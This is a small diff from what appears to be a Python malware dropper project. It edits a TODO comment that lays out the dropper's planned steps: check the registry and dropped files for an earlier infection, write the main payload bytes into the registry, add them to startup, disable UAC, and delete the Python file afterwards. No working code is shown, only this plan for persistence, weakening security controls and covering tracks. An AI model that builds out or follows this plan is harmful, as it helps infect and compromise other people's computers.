@@ -64,7 +64,7 @@ if done == True:
 
 """
   TODO in python dropper code 
-  -Check if the user has been infected before by checking registry keys, files which are dropped by the malware 
+  -Check if the user has been infected before by checking registry keys, files which are dropped by the malware and other etc....
   -if they have not been infected,  Do registry stuff with batch. eg. write the main payload bytes and add  to startup, disabling UAC, etc...., common stuff
   -delete the python file because it is not needed anymore
 """
